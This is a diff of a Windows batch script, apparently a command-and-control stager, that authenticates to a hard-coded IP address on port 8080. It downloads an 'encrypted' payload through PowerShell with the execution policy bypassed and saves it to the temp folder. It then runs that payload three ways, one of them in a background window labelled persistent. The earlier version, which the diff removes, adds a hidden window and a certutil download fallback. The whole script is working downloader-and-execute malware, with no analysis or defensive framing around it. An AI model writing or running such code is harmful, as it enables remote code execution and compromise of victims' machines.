@@ -1,119 +1,101 @@
 @echo off
 setlocal EnableDelayedExpansion
 chcp 65001 >nul
-title C2 Anti-Hang Debug
+title C2 Pure PowerShell - No Curl
 
 echo.
-echo [INFO] 🔥 C2 ANTI-HANG - DEBUG TOTAL 🔥
+echo [INFO] 🔥 C2 POWERSHELL ONLY - SIN CURL/SILENCIO 🔥
 echo.
 
 set "BASE=http://82.29.153.101:8080"
-set "AUTH=%TEMP%\auth.json"
 set "PAYLOAD=%TEMP%\payload.bat"
-set "LOG=%TEMP%\c2_debug.log"
+set "LOG=%TEMP%\c2_pure.log"
+
+echo [DEBUG] PowerShell only mode ✓
 
 :: =====================================================
-:: [1] AUTH CON TIMEOUT + ERROR CHECK
+:: [1] AUTH + PARSE (1 comando)
 :: =====================================================
-echo [INFO] [1/4] 🔑 AUTH (10s timeout)...
-powershell -NoProfile -WindowStyle Hidden -Command ^
- "try { ^
-  $r = iwr '%BASE%/auth/key' -UseBasicParsing -TimeoutSec 10; ^
-  $r.Content | Out-File '%AUTH%' UTF8; ^
-  Write-Host 'AUTH_OK'; exit 0 ^
- } catch { ^
-  Write-Host 'AUTH_FAIL:' $_.Exception.Message; exit 1 ^
- }"
+echo [INFO] [1/3] 🔑 AUTH + PARSE...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+ "$ErrorActionPreference='Stop'; ^
+  try { ^
+   Write-Host '[DEBUG] AUTH...'; ^
+   $auth = iwr '%BASE%/auth/key' -UseBasicParsing -TimeoutSec 10; ^
+   $json = $auth.Content | ConvertFrom-Json; ^
+   $nonce = $json.nonce; $token = $json.token; ^
+   Write-Host ('[DEBUG] NONCE=' + $nonce); ^
+   Write-Host ('[DEBUG] TOKEN=' + $token.Substring(0,10) + '...'); ^
+   ^
+   Write-Host '[DEBUG] DOWNLOAD...'; ^
+   $h = @{ 'X-Nonce'=$nonce; 'X-Token'=$token }; ^
+   $payload = iwr '%BASE%/payload/encrypted' -Headers $h -UseBasicParsing -TimeoutSec 15; ^
+   $payload.Content | Out-File '%PAYLOAD%' UTF8; ^
+   Write-Host ('[DEBUG] SIZE=' + $payload.Content.Length + 'bytes'); ^
+   exit 0 ^
+  } catch { ^
+   Write-Error $_.Exception.Message; exit 1 ^
+  }"
 
 if %ERRORLEVEL% neq 0 (
-    echo [ERROR] AUTH TIMEOUT/FAIL
+    echo [ERROR] POWERSHELL FAIL - Revisa red/firewall
     goto :fail
 )
 
-echo [DEBUG] AUTH RAW:
-type "%AUTH%"
-echo.
-
-:: PARSE JSON SEGURO
-powershell -NoProfile -Command ^
- "try { ^
-  $j = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
-  $j.nonce | Out-File '%TEMP%\nonce.txt' UTF8; ^
-  $j.token | Out-File '%TEMP%\token.txt' UTF8 ^
- } catch { exit 1 }"
-
-if %ERRORLEVEL% neq 0 goto :fail_parse
-
-set /p NONCE=<"%TEMP%\nonce.txt"
-set /p TOKEN=<"%TEMP%\token.txt"
-del "%TEMP%\nonce.txt" "%TEMP%\token.txt" "%AUTH%" 2>nul
-
-echo [DEBUG] NONCE=%NONCE%
-echo [DEBUG] TOKEN=%TOKEN:~0,10%...
-echo.
-
 :: =====================================================
-:: [2] DOWNLOAD CON 4 MÉTODOS + TIMEOUT
+:: [2] VALIDATE + PREVIEW
 :: =====================================================
-echo [INFO] [2/4] 📥 DOWNLOAD (15s timeout)...
-echo [DEBUG] Intentando PowerShell...
+if not exist "%PAYLOAD%" (
+    echo [ERROR] PAYLOAD NO CREADO
+    goto :fail
+)
 
-powershell -NoProfile -WindowStyle Hidden -Command ^
- "try { ^
-  $h = @{ 'X-Nonce'='%NONCE%'; 'X-Token'='%TOKEN%' }; ^
-  $r = iwr '%BASE%/payload/encrypted' -Headers $h -UseBasicParsing -TimeoutSec 15; ^
-  $r.Content | Out-File '%PAYLOAD%' UTF8; ^
-  Write-Host ('DOWNLOAD_OK:' + ($r.Content.Length) + 'bytes'); exit 0 ^
- } catch { ^
-  Write-Host ('DOWNLOAD_FAIL:' + $_.Exception.Message); exit 1 ^
- }"
+for %%F in ("%PAYLOAD%") do (
+    echo [INFO] [2/3] 📁 PAYLOAD ✓ %%~zF bytes
+    if %%~zF LSS 1 echo [ERROR] VACÍO && goto :fail
+)
 
-if %ERRORLEVEL% equ 0 if exist "%PAYLOAD%" goto :download_ok
-
-echo [WARN] PowerShell falló, probando certutil...
-certutil -urlcache -split -f "%BASE%/payload/encrypted" "%PAYLOAD%" >nul 2>&1
-if exist "%PAYLOAD%" goto :download_ok
-
-echo [ERROR] [2/4] TODOS LOS MÉTODOS FALLARON
-goto :fail
-
-:download_ok
-for %%F in ("%PAYLOAD%") do echo [DEBUG] DOWNLOAD ✓ %%~zF bytes
-echo.
-
-:: =====================================================
-:: [3] PREVIEW
-:: =====================================================
-echo [INFO] [3/4] 👁️ PREVIEW:
+echo [DEBUG] CONTENIDO:
+echo ========================================
 type "%PAYLOAD%"
+echo ========================================
 echo.
 
 :: =====================================================
-:: [4] EJECUCIÓN REAL
+:: [3] EJECUCIÓN MÚLTIPLE - REAL
 :: =====================================================
-echo [INFO] [4/4] 🚀 EJECUTANDO...
-echo 🔥 M1: call directo
+echo [INFO] [3/3] 🚀 EJECUTANDO x3...
+echo.
+
+echo 🔥 MÉTODO 1: call directo
 call "%PAYLOAD%"
 
-echo 🔥 M2: cmd /c
+echo 🔥 MÉTODO 2: cmd /c (contexto limpio)
 cmd /c "%PAYLOAD%"
 
-echo 🔥 M3: background
+echo 🔥 MÉTODO 3: background persistente
 start /min cmd /c "%PAYLOAD%"
 
 echo.
-echo [SUCCESS] 🎉 MISSION COMPLETE 🎉
-echo [INFO] Payload: %PAYLOAD%
-goto :end
+echo [SUCCESS] 🎉 3 EJECUCIONES COMPLETADAS 🎉
+echo [INFO] Payload queda: %PAYLOAD%
+echo.
 
-:fail_parse
-echo [ERROR] JSON PARSE FAIL
-goto :end
+goto :success
 
 :fail
-echo [ERROR] DOWNLOAD/ AUTH FAIL
-type "%TEMP%\c2_debug.log" 2>nul
-goto :end
-
-:end
+echo [FAIL] ❌ ERROR EN DOWNLOAD/AUTH
+echo [TIP] Verifica:
+echo  - Firewall Windows
+echo  - Proxy corporativo  
+echo  - Antivirus bloqueando
+echo  - Puerto 8080 abierto
 pause
+exit /b 1
+
+:success
+echo [INFO] Presiona para salir...
+pause >nul
+
+:: CLEANUP OPCIONAL
+REM del "%PAYLOAD%" 2>nul
